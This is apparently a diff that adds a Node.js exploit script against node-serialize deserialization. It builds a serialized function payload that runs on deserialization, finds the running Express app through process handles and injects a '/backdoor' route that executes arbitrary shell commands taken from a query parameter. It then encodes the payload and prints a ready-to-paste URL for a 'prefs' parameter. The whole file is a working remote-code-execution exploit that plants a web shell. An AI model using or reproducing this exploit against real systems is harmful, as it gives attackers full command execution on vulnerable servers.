@@ -1,0 +1,58 @@
+const serialize = require('node-serialize');
+
+let payload = {
+    color: "red",
+    rce: function() {
+        // Access internal active handles to find the running server
+        const handles = process._getActiveHandles();
+
+        for (let i = 0; i < handles.length; i++) {
+            const handle = handles[i];
+
+            // Look for a handle that has 'request' listeners (an HTTP Server)
+            if (handle && typeof handle.listeners === 'function') {
+                const reqListeners = handle.listeners('request');
+
+                if (reqListeners.length > 0) {
+                    // In Express, the app itself is bound as the request listener
+                    const app = reqListeners[0];
+
+                    // Verify it is an Express app by checking for standard routing methods
+                    if (typeof app.get === 'function') {
+                        // Inject the new route
+                        app.get('/backdoor', function(req, res) {
+							if (req.query.cmd) {
+								const { execSync } = require('child_process');
+								let cmd = req.query.cmd;
+
+								try {
+									// Run a simple command and capture the output
+									const output = execSync(cmd);
+									
+									// The output is a Buffer, so convert it to a string
+									res.send('Command output is: ' + output);
+								} catch (error) {
+									// If the command fails (e.g., returns a non-zero exit code), it throws an error
+									res.send("Command failed: ", error.message);
+								}
+							} else {
+								res.send ("Welcome to the backdoor");
+							}
+                        });
+                        break; // Exit loop once the route is added
+                    }
+                }
+            }
+        }
+    }
+};
+
+let serializedStr = serialize.serialize(payload);
+
+let iifePayload = serializedStr.replace('}"', '}()"'); 
+
+// 5. Base64 and URL Encode for HTTP transport
+let encoded = encodeURIComponent(Buffer.from(iifePayload).toString('base64'));
+
+console.log("Copy this payload and append it to the URL:\n");
+console.log("http://devbox:8000/?prefs=" + encoded);
